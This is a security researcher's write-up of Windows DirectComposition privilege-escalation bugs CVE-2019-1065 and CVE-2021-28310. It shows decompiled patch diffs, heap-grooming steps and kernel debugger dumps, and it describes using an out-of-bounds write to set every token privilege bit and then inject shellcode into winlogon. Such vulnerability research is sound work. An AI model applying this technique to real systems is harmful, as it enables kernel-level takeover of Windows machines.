# CVE 2019 1065

This is a vulnerability in DirectComposition, which is a user-mode graphics component but is managed by win32kbase; so commands are sent to win32kbase.sys through syscalls and then delegated to user-mode dwm.exe through ALPC. It's all c++ so resources are managed through refcounted objects/raii. In fact there are a lot of reference counting bugs: reference count not being incremented when it should, decremented when it shouldn't, reference count only being checked after it has already been incremented, reference count of bound references not being checked after they were freed, reference count missing altogether, etc. There also have been issues around insufficient synchronization primitives. So all of this together with the weird user-mode/kernel-mode IPC system makes this a rich attack surface. If you just diff between the win32kbase.sys functions and their corresponding dwmcore.dll functions and look for differences in how reference count is checked/updated you will probably find something eventually. Or just look for things that were patched in win32kbase.sys but neglected to patch in dwmcore.dll. The heap feng shui is kind of a pain in the ass though, so I hope somebody might find this helpful.

This vulnerability concerns a missing count/size check in the DirectComposition::CPropertySetMarshaler::UpdateProperty<T> methods. This class allows you to allocate properties, and then other classes can bind to this object and use it to interface with some of their bound objects. Properties have their own types (like vector, quaternion,  3x2 matrix, 4x4 matrix, etc) and are stored in kind of a hashmap structure. CPropertySetMarshaler objects hold a pointer to one area of memory with type/index, and another pointer to a buffer that holds all the actual property data (I will call it propertyinfo buffer and propertyset buffer). You can add new properties with AddProperty and update their contents with UpdateProperty. The problem is that, UpdateProperty did not check a count of existing properties. And since the propertyinfo buffer is not zeroed out after being allocated, this meant that if some contrived data were present in the same chunk that looks like a property type:index pair, it would just assume this is a valid property and write outside the bounds of the propertyset buffer. This is what the functions look like before and after the patch

May:
```
long __thiscall
DirectComposition::CPropertySetMarshaler::
UpdateProperty<struct_PropertySetVector2Value,struct_D2DVector2>
          (CPropertySetMarshaler *this,PropertySetVector2Value *pPropertySetVal)

{
  long lVar1;
  ulonglong iPropertyId;
  uint pPropertySetBuff;
  
  iPropertyId = (ulonglong)*(uint *)pPropertySetVal;
  pPropertySetBuff = *(uint *)(*(longlong *)(this + 0x38) + 4 + iPropertyId * 8);
  //checks that the provided type and index/offset match the existing propertyset buffer
  if ((*(uint *)(pPropertySetVal + 4) == (pPropertySetBuff & 0x1fffffff)) &&
     (*(int *)(pPropertySetVal + 8) == *(int *)(*(longlong *)(this + 0x38) + iPropertyId * 8))) {
    *(undefined8 *)((ulonglong)(pPropertySetBuff & 0x1fffffff) + *(longlong *)(this + 0x48)) =
         *(undefined8 *)(pPropertySetVal + 0xc);
    pPropertySetBuff = *(uint *)(*(longlong *)(this + 0x38) + 4 + iPropertyId * 8);
    lVar1 = 0;
    if ((pPropertySetBuff & 0xe0000000) != 0x20000000) {
      *(uint *)(*(longlong *)(this + 0x38) + 4 + iPropertyId * 8) =
           pPropertySetBuff & 0x1fffffff | 0x40000000;
      lVar1 = 0;
    }
  }
  else {
    lVar1 = -0x3ffffff3;
  }
  return lVar1;
}
```


June:
```
long __thiscall
DirectComposition::CPropertySetMarshaler::UpdateProperty<struct_D2DVector2>
          (CPropertySetMarshaler *this,PropertySetValue *pPropertySetVal,D2DVector2 *pNewVector)

{
  ulonglong uVar1;
  uint iPropertyId;
  
  iPropertyId = *(uint *)pPropertySetVal;
  //checks if provided PropertyId < CPropertySetMarshaler.iNumProperties
  if (iPropertyId < *(uint *)(this + 0x40)) {
    uVar1 = (ulonglong)iPropertyId;
    pPropertySetBuff = *(uint *)(*(longlong *)(this + 0x38) + 4 + (ulonglong)iPropertyId * 8);
    //additionally checks that the provided type and index/offset match the existing propertyset buffer
    if ((*(uint *)(pPropertySetVal + 4) == (pPropertySetBuff & 0x1fffffff)) &&
       (*(int *)(pPropertySetVal + 8) == *(int *)(*(longlong *)(this + 0x38) + uVar1 * 8))) {
      *(undefined8 *)((ulonglong)(pPropertySetBuff & 0x1fffffff) + *(longlong *)(this + 0x48)) =
           *(undefined8 *)pNewVector;
      pPropertySetBuf.Id = *(uint *)(*(longlong *)(this + 0x38) + 4 + uVar1 * 8);
      if ((pPropertySetBuf.Id & 0xe0000000) == 0x20000000) {
        return 0;
      }
      *(uint *)(*(longlong *)(this + 0x38) + 4 + uVar1 * 8) = pPropertySetBuff & 0x1fffffff | 0x40000000;
      return 0;
    }
  }
  return -0x3ffffff3;
}
```



So how do we put arbitrary data in the same chunk? We have access to classes like CExpressionMarshaler which let you make an arbitrary sized allocation with arbitrary contents (as well as bitmaps and so forth). As well, the DirectComposition objects aren't zeroed after allocation and there is no partitioning of different object types or object metadata (think TypeIsolation for eg., nothing like that to worry about). Nice and lazy... The format is like  
buffer[0]=handle  
buffer[1]=0x15  
buffer[2]=allocation size n  
buffer[3..(n/3)+2]=contents  
CTableTransferEffectMarshaler is similar; in both cases the expression is evaluated before it's marshaled for dwm. I found CExpressionMarshaler has an additional constraint of (size of buffer) % 0x18 == 0, so we'll use CTableTransferEffectMarshaler.

You can use the out-of-bounds write primitive to just overwrite a vtable pointer, but let's make things more interesting and pretend that windows does some integrity checking that prevents accesses of user-mode pages from kernel mode at specific sites (like vtables/indirect call sites since these are a common target for memory corruption exploits; I think they'll probably play around with this kind of limited SMAP in the future). If we overwrite the address of the property buffer of CPropertySetMarshaler, then that gets us an arbitrary write. We can leak the address of the current process token and then set the privilege present/enabled bits to 1 to give ourselves SeDebugPrivilege. And then politely restore the property buffers using the same oob write. The groom is a little challenging since the vulnerable object and the object to be overwritten are in the same chunk size bin. My initial idea was
1) make a bunch of bitmaps to fill up memory
2) make a bunch of cpropertysetmarshaler with at least one property
3) make a bunch of ctabletransfereffectmarshaler with mock properties; they will be in a different size bin from cpropertysetmarshaler
4) make like half as much of cpropertysetmarshaler with (sizeof(cexpressionmarshaler) - 8)/8 properties
5) make holes in cexpressionmarshaler
6) make holes in first set of cpropertysetmarshaler
7) make one more property for second set of cpropertyset marshaler, causing reallocation
8) hopefully some of their propertyinfo will occupy the freed cexpressionmarshaler chunks and their propertyset buffer will occupy the
holes in the first set of cpropertysetmarshaler


The size of CPropertySetMarshaler on 1809 was 0x70

```
1: kd> !pool ffffb38d`464d64d0
Pool page ffffb38d464d64d0 region is Paged session pool
 ffffb38d464d6000 size:   60 previous size:    0  (Free)       ....
 ffffb38d464d6060 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d464d60d0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d464d6140 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d464d61b0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d464d6220 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d464d6290 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d464d6300 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d464d6370 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d464d63e0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d464d6450 size:   70 previous size:    0  (Free)       Ussy
*ffffb38d464d64c0 size:   70 previous size:    0  (Allocated) *DCpb Process: ffffa20a1e83b540
		Pooltag DCpb : DCOMPOSITIONTAG_PROPERTYSETMARSHALER, Binary : win32kbase!DirectComposition::C
1: kd> dqs ffffb38d`464d64d0-8 ffffb38d`464d64d0+78h
ffffb38d`464d64c8  c26b75e1`5f6fbf7c
ffffb38d`464d64d0  ffffb3d4`0f73c470
ffffb38d`464d64d8  00000000`00000000
ffffb38d`464d64e0  00000001`00000080
ffffb38d`464d64e8  00000000`00000001
ffffb38d`464d64f0  00000000`00000000
ffffb38d`464d64f8  00000000`00000000
ffffb38d`464d6500  00000000`00000000
ffffb38d`464d6508  ffffb38d`464d2270
ffffb38d`464d6510  00000001`00000001
ffffb38d`464d6518  ffffb38d`464d2110
ffffb38d`464d6520  00000008`00000008
ffffb38d`464d6528  00000000`00000000
ffffb38d`464d6530  79737355`2b070000
```

buffer to overwrite is offset 0x48. We need the propertyinfo of adjacent properties to be in the same bucket as a fake propertyinfo large enough to write +0x48, but also a different bucket from CPropertySetMarshaler. also the propertyset buffer needs to be the same size as CPropertySetMarshaler (0x70).

```
1: kd> dqs ffffb38d`46546540
ffffb38d`46546540  ffffb3d4`0f73c470 win32kbase!DirectComposition::CPropertySetMarshaler::`vftable'
ffffb38d`46546548  00000000`00000000
ffffb38d`46546550  00000001`00000082
ffffb38d`46546558  00000000`00000001
ffffb38d`46546560  00000000`00000000
ffffb38d`46546568  00000000`00000000
ffffb38d`46546570  00000000`00000000
ffffb38d`46546578  ffffb38d`464b6cd0
ffffb38d`46546580  00000006`00000006
ffffb38d`46546588  ffffb38d`46546150
ffffb38d`46546590  00000060`00000060
ffffb38d`46546598  00000000`00000000
ffffb38d`465465a0  79737355`2b070000
ffffb38d`465465a8  c26b75e1`619b6fdc
ffffb38d`465465b0  00000000`00000244
ffffb38d`465465b8  00000000`00000264
1: kd> dqs ffffb38d`46546150
ffffb38d`46546150  cafebabe`cafebabe
ffffb38d`46546158  cafebabe`cafebabe
ffffb38d`46546160  cafebabe`cafebabe
ffffb38d`46546168  cafebabe`cafebabe
ffffb38d`46546170  cafebabe`cafebabe
ffffb38d`46546178  cafebabe`cafebabe
ffffb38d`46546180  cafebabe`cafebabe
ffffb38d`46546188  cafebabe`cafebabe
ffffb38d`46546190  cafebabe`cafebabe
ffffb38d`46546198  cafebabe`cafebabe
ffffb38d`465461a0  cafebabe`cafebabe
ffffb38d`465461a8  cafebabe`cafebabe
ffffb38d`465461b0  79737355`2b070000
ffffb38d`465461b8  c26b75e1`619b6bcc
ffffb38d`465461c0  00000000`00000244
ffffb38d`465461c8  00000000`00000264
1: kd> !pool ffffb38d`46546150
Pool page ffffb38d46546150 region is Paged session pool
 ffffb38d46546000 size:   60 previous size:    0  (Free)       ....
 ffffb38d46546060 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d465460d0 size:   70 previous size:    0  (Free)       Ussy
*ffffb38d46546140 size:   70 previous size:    0  (Allocated) *Uspw
		Pooltag Uspw : USERTAG_DYNAMICARRAY, Binary : win32k!CDynamicArray::Add
 ffffb38d465461b0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546220 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546290 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546300 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546370 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d465463e0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546450 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d465464c0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546530 size:   70 previous size:    0  (Allocated)  DCpb Process: ffffa20a1eac7080
 ffffb38d465465a0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546610 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546680 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d465466f0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546760 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d465467d0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546840 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d465468b0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546920 size:   70 previous size:    0  (Allocated)  Usdc
 ffffb38d46546990 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546a00 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546a70 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546ae0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546b50 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546bc0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546c30 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546ca0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546d10 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546d80 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546df0 size:   70 previous size:    0  (Free)       Ussy
 ffffb38d46546e60 size:   70 previous size:    0  (Free)       DCpb
 ffffb38d46546ed0 size:   70 previous size:    0  (Free)       DCpb
 ffffb38d46546f40 size:   70 previous size:    0  (Free)       DCpb
1: kd> dqs ffffb38d`464b6cd0
ffffb38d`464b6cd0  20000000`00000045
ffffb38d`464b6cd8  20000010`00000045
ffffb38d`464b6ce0  20000020`00000045
ffffb38d`464b6ce8  20000030`00000045
ffffb38d`464b6cf0  20000040`00000045
ffffb38d`464b6cf8  20000050`00000045
ffffb38d`464b6d00  79737355`2b040000
ffffb38d`464b6d08  c26b75e1`5e8f27bc
ffffb38d`464b6d10  00000000`00001870
ffffb38d`464b6d18  00000000`00001a28
ffffb38d`464b6d20  00000000`00001aac
ffffb38d`464b6d28  00000000`00001a80
ffffb38d`464b6d30  00000000`000017e8
ffffb38d`464b6d38  ffffb38d`00000073
ffffb38d`464b6d40  706d7447`23040000
ffffb38d`464b6d48  c26b75e1`5e8f27fc
1: kd> !pool ffffb38d`464b6cd0
Pool page ffffb38d464b6cd0 region is Paged session pool
...
...
 ffffb38d464b6b40 size:   40 previous size:    0  (Allocated)  Uiso
 ffffb38d464b6b80 size:   40 previous size:    0  (Allocated)  Uiso
 ffffb38d464b6bc0 size:   40 previous size:    0  (Allocated)  Urdr
 ffffb38d464b6c00 size:   40 previous size:    0  (Allocated)  Uiso
 ffffb38d464b6c40 size:   40 previous size:    0  (Allocated)  Uscd
 ffffb38d464b6c80 size:   40 previous size:    0  (Allocated)  Uiso
*ffffb38d464b6cc0 size:   40 previous size:    0  (Allocated) *Uspw
		Pooltag Uspw : USERTAG_DYNAMICARRAY, Binary : win32k!CDynamicArray::Add
 ffffb38d464b6d00 size:   40 previous size:    0  (Allocated)  Ussy Process: ffffa20a1f652440
 ffffb38d464b6d40 size:   40 previous size:    0  (Free)       Gtmp
 ffffb38d464b6d80 size:   40 previous size:    0  (Allocated)  Uiso
 ffffb38d464b6dc0 size:   40 previous size:    0  (Allocated)  DCpd Process: ffffa20a1eac7080
 ffffb38d464b6e00 size:   40 previous size:    0  (Free)       Gtmp
 ffffb38d464b6e40 size:   40 previous size:    0  (Free)       Gtmp
 ffffb38d464b6e80 size:   40 previous size:    0  (Free)       FDrq
 ffffb38d464b6ec0 size:   40 previous size:    0  (Free)       Ussw
 ffffb38d464b6f00 size:   40 previous size:    0  (Free)       Gtmp
 ffffb38d464b6f40 size:   40 previous size:    0  (Free)       FDrq
 ffffb38d464b6f80 size:   40 previous size:    0  (Free)       Gtmp
 ffffb38d464b6fc0 size:   40 previous size:    0  (Free)       Gtmp
```
 
Great, so propertyinfo size is 0x40, and we can make 6 D2DVector4 to get the properties buffer in the same bucket as CPropertySetMarshaler. So what we need to do is make 5, make holes, then make additional properties and hopefully fill in some of the holes. Upon making a fifth property, the propertyinfo buffer will grow to 0x50. We want it to grow right after the CTableTransferEffectMarshaler filter buffers free to occupy the same holes. If we add two D2DVector2 instead of another D2DVector4, it will grow to size 0x50. If CtableTranserEffectMarshaler filter buffers are also size 0x50, it should occupy the same holes. The memory layout after doing fengshui is like:

```
1: kd> dqs ffffb38d`472358b0
ffffb38d`472358b0  ffffb3d4`0f73c470 win32kbase!DirectComposition::CPropertySetMarshaler::`vftable'
ffffb38d`472358b8  ffffb38d`47235680
ffffb38d`472358c0  00000001`00000083
ffffb38d`472358c8  00000000`00000003
ffffb38d`472358d0  00000000`00000000
ffffb38d`472358d8  00000000`00000000
ffffb38d`472358e0  00000000`00000000
ffffb38d`472358e8  ffffb38d`4733e030
ffffb38d`472358f0  00000007`00000007
ffffb38d`472358f8  ffffb38d`465b08f0
ffffb38d`47235900  00000060`00000060
ffffb38d`47235908  00000000`00000000
ffffb38d`47235910  62704344`2b070000
ffffb38d`47235918  c26b75e1`5e2e476c
ffffb38d`47235920  ffffb3d4`0f73c470 win32kbase!DirectComposition::CPropertySetMarshaler::`vftable'
ffffb38d`47235928  00000000`00000000
1: kd> dqs ffffb38d`4733e030 L40
ffffb38d`4733e030  00000000`00000045
ffffb38d`4733e038  00000010`00000045
ffffb38d`4733e040  00000020`00000045
ffffb38d`4733e048  00000030`00000045
ffffb38d`4733e050  00000040`00000045
ffffb38d`4733e058  20000050`00000023
ffffb38d`4733e060  20000058`00000023
ffffb38d`4733e068  200000b8`00000023   <--freed CTableTransferEffectMarshaler filter buffer data
ffffb38d`4733e070  62664344`2b050000
ffffb38d`4733e078  c26b75e1`5e3efe0c
ffffb38d`4733e080  cafebabe`cafed00d   <--allocated CTableTransferEffectMarshaler filter buffer
ffffb38d`4733e088  cafebabe`cafed00d
ffffb38d`4733e090  cafebabe`cafed00d
ffffb38d`4733e098  cafebabe`cafed00d
ffffb38d`4733e0a0  cafebabe`cafed00d
ffffb38d`4733e0a8  cafebabe`cafed00d
ffffb38d`4733e0b0  200000b8`00000023
ffffb38d`4733e0b8  200000b8`00000023
ffffb38d`4733e0c0  77707355`23050000
ffffb38d`4733e0c8  00000000`00000000
1: kd> dqs ffffb38d`465b08f0
ffffb38d`465b08f0  cafebabe`cafebabe
ffffb38d`465b08f8  cafebabe`cafebabe
ffffb38d`465b0900  cafebabe`cafebabe
ffffb38d`465b0908  cafebabe`cafebabe
ffffb38d`465b0910  cafebabe`cafebabe
ffffb38d`465b0918  cafebabe`cafebabe
ffffb38d`465b0920  cafebabe`cafebabe
ffffb38d`465b0928  cafebabe`cafebabe
ffffb38d`465b0930  cafebabe`cafebabe
ffffb38d`465b0938  cafebabe`cafebabe
ffffb38d`465b0940  cafebabe`cafebabe
ffffb38d`465b0948  cafebabe`cafebabe
ffffb38d`465b0950  62704344`2b070000
ffffb38d`465b0958  c26b75e1`5f56172c
ffffb38d`465b0960  ffffb3d4`0f73c470 win32kbase!DirectComposition::CPropertySetMarshaler::`vftable'
ffffb38d`465b0968  00000000`00000000
```

Perfect! :D We Should be able to write out of bounds at some arbitrary offset now. If we write some junk to *this+0x48 (offset +0xb8 into propertyset buffer) we will get a bluescreen when CPropertySetMarshaler calls its destructor

```
1: kd> dqs poi(rbx+48h) L40
fffff4cf`8703fde0  200000b8`00000023
fffff4cf`8703fde8  200000b8`00000023
fffff4cf`8703fdf0  200000b8`00000023
fffff4cf`8703fdf8  200000b8`00000023
fffff4cf`8703fe00  200000b8`00000023
fffff4cf`8703fe08  200000b8`00000023
fffff4cf`8703fe10  200000b8`00000023
fffff4cf`8703fe18  200000b8`00000023
fffff4cf`8703fe20  200000b8`00000023
fffff4cf`8703fe28  200000b8`00000023
fffff4cf`8703fe30  cafebabe`cafebabe
fffff4cf`8703fe38  cafebabe`cafebabe
fffff4cf`8703fe40  62704344`2b070000
fffff4cf`8703fe48  c9699838`25e9b8ca
fffff4cf`8703fe50  fffff4a9`cfd3c470 win32kbase!DirectComposition::CPropertySetMarshaler::`vftable'
fffff4cf`8703fe58  00000000`00000000
fffff4cf`8703fe60  00000001`00000001
fffff4cf`8703fe68  00000000`00000200
fffff4cf`8703fe70  00000000`00000000
fffff4cf`8703fe78  00000000`00000000
fffff4cf`8703fe80  00000000`00000000
fffff4cf`8703fe88  fffff4cf`861ee650
fffff4cf`8703fe90  00000007`00000007
fffff4cf`8703fe98  cafed00d`cafebabe  <---overwritten propertyset buffer
fffff4cf`8703fea0  00000060`00000060
fffff4cf`8703fea8  00000000`00000000
fffff4cf`8703feb0  62704344`2b070000
fffff4cf`8703feb8  c9699838`25e9b83a
```
                                                      
```
1: kd> !analyze -v
BUGCHECK_CODE:  3b

BUGCHECK_P1: c0000005

BUGCHECK_P2: fffff8056115dda5

BUGCHECK_P3: ffff8580ab1c5770

BUGCHECK_P4: 0

CONTEXT:  ffff8580ab1c5770 -- (.cxr 0xffff8580ab1c5770)
rax=cafed00dcaf00000 rbx=fffff80560e13000 rcx=0000000000000000
rdx=0000000000000000 rsi=cafed00dcafebabe rdi=0000000000000000
rip=fffff8056115dda5 rsp=ffff8580ab1c6160 rbp=ffff892ec4c988a0
 r8=0000000000000000  r9=0000000000000000 r10=0000000000000008
r11=ffff892ec6cf7ff8 r12=0000000000000001 r13=ffffd68ecb799080
r14=ffff800000000000 r15=a2e64eada2e64ead
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
nt!ExFreePoolWithTag+0x125:
fffff805`6115dda5 4c8b6810        mov     r13,qword ptr [rax+10h] ds:002b:cafed00d`caf00010=????????????????
Resetting default scope

PROCESS_NAME:  cve_2019_1065.exe

STACK_TEXT:  
ffff8580`ab1c6160 ffff8960`2a8cf95d     : ffff892e`c0602080 00000000`00000000 ffffd68e`00000059 00000000`62704344 : nt!ExFreePoolWithTag+0x125
ffff8580`ab1c6290 ffff8960`2abdbca7     : 00000000`00000000 cafed00d`cafebabe cafed00d`cafebabe 00000000`00000000 : win32kfull!Win32FreePoolImpl+0x4d
ffff8580`ab1c62c0 ffff8960`2abdb92d     : 00000000`00000000 00000000`00000000 00000000`00000000 ffffd68e`cd90d970 : win32kbase!Win32FreePool+0x27
ffff8580`ab1c62f0 ffff8960`2abac4a8     : ffff892e`c6da3960 00000000`00000000 ffffd68e`cf634001 00000000`00000001 : win32kbase!DirectComposition::CPropertySetMarshaler::`vector deleting destructor'+0x1d
ffff8580`ab1c6320 ffff8960`2abe65f8     : ffff892e`c6da3960 00000000`00000000 00000000`00000000 ffff892e`c4c98800 : win32kbase!DirectComposition::CApplicationChannel::ReleaseResource+0x240
ffff8580`ab1c6350 ffff8960`2abe651a     : ffff892e`c4c988a0 ffffd68e`cf634080 00000000`00000000 ffffd68e`cf634001 : win32kbase!DirectComposition::CApplicationChannel::ReleaseResource+0x8c
ffff8580`ab1c6390 ffff8960`2abe639d     : 00000000`00000200 00000000`00000002 ffffd68e`cf634080 ffff892e`c6cf8a70 : win32kbase!DirectComposition::CApplicationChannel::ReleaseAllResources+0x52
ffff8580`ab1c63c0 ffff8960`2abe908f     : ffff892e`c61de4d0 ffff892e`c6cf8a70 ffff892e`c616adb0 ffffd68e`ce029600 : win32kbase!DirectComposition::CApplicationChannel::Shutdown+0x8d
ffff8580`ab1c63f0 ffff8960`2abe8fa7     : ffff892e`c616adb0 ffff892e`c61de4d0 ffff8580`ab1c67f8 ffff7980`8b7ae5f7 : win32kbase!DirectComposition::CChannel::OnProcessDestruction+0x9b
ffff8580`ab1c6420 ffff8960`2abe8d54     : 00000000`00000000 00000000`00000001 ffffd68e`cd066cb0 ffff8580`ab1c67f8 : win32kbase!DirectComposition::CProcessData::`scalar deleting destructor'+0x1f
```


This brings up a good point. We will have to clean up the corrupted CPropertySetMarshaler anyway at some point, to prevent a bluescreen. Thankfully its destructor is pretty permissive; we just need to zero out the same bytes using the same out-of-bounds write primitive.

```
void * __thiscall
DirectComposition::CPropertySetMarshaler::`vector_deleting_destructor'
          (CPropertySetMarshaler *this,uint param_1)

{
  if (*(longlong *)(this + 0x48) != 0) {
    Win32FreePool();
    *(undefined8 *)(this + 0x48) = 0;
  }
  *(undefined4 *)(this + 0x54) = 0;
  *(undefined4 *)(this + 0x50) = 0;
  if (*(longlong *)(this + 0x38) != 0) {
    Win32FreePool();
    *(undefined8 *)(this + 0x38) = 0;
  }
  *(undefined4 *)(this + 0x44) = 0;
  *(undefined4 *)(this + 0x40) = 0;
  if ((param_1 & 1) != 0) {
    Win32FreePool(this);
  }
  return this;
}
```

We also don't want to set token+0xb8 to 0 (this just so happens to be the default dacl offset btw), so we attempt the out-of-bounds write, quit after some (very small) number of successful attempts, and save the property id of the object used to perform each successful attempt. In the cleanup stage, we perform the oob write with only this subset of objects, setting whatever they overwrote to back to 0. If say we have found 8 candidates, we can be almost certain none of the 8 are adjacent to another candidate chunk due to heap randomization. Sequential allocations are expected to be non-adjacent (although there were previously some ways to force a deterministic allocation, these were patched in 16179 I think). Although randomization makes our heap layout less predicatable, we use the nondeterminism to our advantage in this way. Some of our propertyset buffers will be adjacent to other propertyset buffers instead of CPropertySetMarshaler due to randomization, but this is fine since they don't contain a pointer or any sensitive metadata at the offset we're writing to. In the end it's very reliable.

Now we can turn our out-of-bounds write into an arbitrary write to a kernel-mode address, without ever messing with vtables or rop chains or any of that. *If* Windows had effective SMAP this would still be permitted. After all this we can overwrite the present and enabled bitmasks of _SEP_TOKEN_PRIVILEGES to all be 1

```
0: kd> dx -id 0,0,ffffce867c9b9080 -r1 (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffbb0abbc37910))
(*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffbb0abbc37910))                 [Type: _SEP_TOKEN_PRIVILEGES]
    [+0x000] Present          : 0xffffffffffffffff [Type: unsigned __int64]
    [+0x008] Enabled          : 0xffffffffffffffff [Type: unsigned __int64]
    [+0x010] EnabledByDefault : 0x40800000 [Type: unsigned __int64]
```

All this takes place in fractions of a second since NtDCompositionProcessChannelBatchBuffer allows you to dispatch thousands of allocations with one syscall. The heap fengshui with DirectComposition objects is a slight pain in the ass but it's still very reliable. We can now easily just use SeDebugPrivilege to inject some shellcode into winlogon and then call CreateRemoteThread on this shellcode. Or try to use our same PROCESS_ALL_ACCESS handle to create a new process under a SYSTEM parent.

# CVE 2021 28310

This was found by Kaspersky being exploited "in the wild" almost two years later. The security update that added a check for UpdateProperty<D2DVector2> from back in 2019 failed to additionally fix the dwmcore.dll version of the same function. But even so, if UpdateProperty<T> fails in win32kbase, the command will not get marshaled to dwm.exe. So this would not be exploitable, if not for another issue with AddProperty<T> in win32kbase. If an invalid propertyid is passed, it will return an ntstatus error, but only after adding a new property. So you can create a larger number of properties in win32kbase than dwm, and write out of bounds in dwm.


We can see first of all that win32kbase version DirectComposition::CPropertySetMarshaler::AddProperty<D2DVector2> only checks the property id and offset after adding it to the buffer of properties in CPropertySetMarshaler. The properties should always increment by 1; the offset is dependent on the property type but for D2DVector2 it should be (propertyId * 8). If an incorrect propertyid is passed, the property will be added but the function will still return an error and the command will not be passed on to dwm. This can create an inconsistency in the number of references in kerenel-mode vs user-mode:
(Ghidra output)
```
win32kbase.sys:
long __thiscall
DirectComposition::CPropertySetMarshaler::AddProperty<struct_D2DVector2>
          (CPropertySetMarshaler *this,PropertySetValue *pPropertySetBuffer,D2DVector2 *vectorvalue)

{
  int result;
  uint newoffset;
  long lresult;
  uint pPropertyInfoStore [2];
  longlong propertyOffset;
  
  pPropertyInfoStore[0] = 0;
  //AddProperty<D2DVector2>(this->propertiesData, propertyStore.type, value, propertyIdAdded)
  result = PropertySetStorage<CDynamicArrayDefaultTag,PropertySetKernelModeAllocator>::
           AddProperty<D2DVector2>
                     (this + 0x48,*(undefined4 *)(pPropertySetBuffer + 8),vectorvalue,
                      pPropertyInfoStore);
  if (result < 0) {
    //0xc000008c (array bounds exceeded)
    lresult = 0xc000008c;
  }
  else {
    //!!!propertyid is only checked after property is added
    //if propertySet.refcount == propertyIdAdded
    if (pPropertySet[0] == *(uint *)pPropertyInfo) {
      propertyOffset = *(longlong *)(this + 0x48);
      newoffset = *(uint *)(propertyOffset + 4 + (ulonglong)pPropertyInfo[0] * 8) & 0x1fffffff;
      //if storageOffset == this->properties[propertyId]->offset & 0x1fffffff
      if (newoffset == *(uint *)(pPropertyInfo + 4)) {
        //update propertyinfo buffer
        *(uint *)(propertyOffset + 4 + (ulonglong)pPropertyInfo[0] * 8) =
             newoffset | 0x20000000;
        return 0;
      }
    }
    //0xc000000d (invalid parameter)
    //!!!properties should be decremented if this branch is reached but aren't
    //patch adds a decrement here (but it seems like you could still underflow the value if you make two bad 
    //ones simultaneously  since there's no lock? but even then UpdatePropery would still fail)
    lresult = 0xc000000d;
  }
  return lresult;
}
```
```
dwmcore.dll:
ulonglong PropertySetStorage<DynArrayNoZero,PropertySetUserModeAllocator>::AddProperty<D2DVector2>
                    (longlong *param_1,undefined4 param_2,undefined8 *param_3,uint *param_4)

{
  uint uVar1;
  uint uVar2;
  ulonglong uVar3;
  uint uVar4;
  undefined4 local_res8;
  uint uStackX12;
  
  *param_4 = 0xffffffff;
  uVar1 = *(uint *)(param_1 + 7);
  uVar2 = *(uint *)(param_1 + 3);
  if ((uVar1 & 0xe0000000) != 0) {
    return 0x8000000b;
  }
```

The win32kbase version CPropertySetMarshaler stores a reference count of associated objects at *this+0x50. If we look in user-mode CPropertySet::UpdateProperty<D2DVector2> we can see it lacks the check that propertyid < properties count which is present in kernel-mode CPropertySetMarshaler::UpdateProperty<D2DVector2>. In fact it looks identical to the 2019 win32kbase version before it was patched (In fact all the UpdateProperty methods lack the reference count check and all the AddProperty methods only check the reference count after it has already been incremented).
(Ghidra output):
win32kbase.sys:
```
long __thiscall
DirectComposition::CPropertySetMarshaler::UpdateProperty<struct_D2DVector2>
          (CPropertySetMarshaler *this,PropertySetValue *pPropertySetBuffer,D2DVector2 *pNewVector)

{
  ulonglong uVar1;
  uint iPropertyId;
  
  iPropertyId = *(uint *)pPropertySetBuffer;
  //checks if propertyId < refcount
  if (iPropertyId < *(uint *)(this + 0x50)) {
    uVar1 = (ulonglong)iPropertyId;
    //additionally checks propertyinfo to see property size and type matches
    //if PropertySetBuffer.PropertyId * 8 == PropertyInfoStore[propertyId][0] &&
    //PropertySetBuffer.ExpressionType == PropertyInfoStore[propertyId][1]
    iPropertyId = *(uint *)(*(longlong *)(this + 0x48) + 4 + (ulonglong)iPropertyId * 8);
    if ((*(uint *)(pPropertySetBuffer + 4) == (iPropertyId & 0x1fffffff)) &&
       (*(int *)(pPropertySetBuffer + 8) == *(int *)(*(longlong *)(this + 0x48) + uVar1 * 8)))
    {
      *(undefined8 *)((ulonglong)(iPropertyId & 0x1fffffff) + *(longlong *)(this + 0x58)) =
           *(undefined8 *)pNewVector;
      iPropertyId = *(uint *)(*(longlong *)(this + 0x48) + 4 + uVar1 * 8);
      if ((iPropertyId & 0xe0000000) == 0x20000000) {
        return 0;
      }
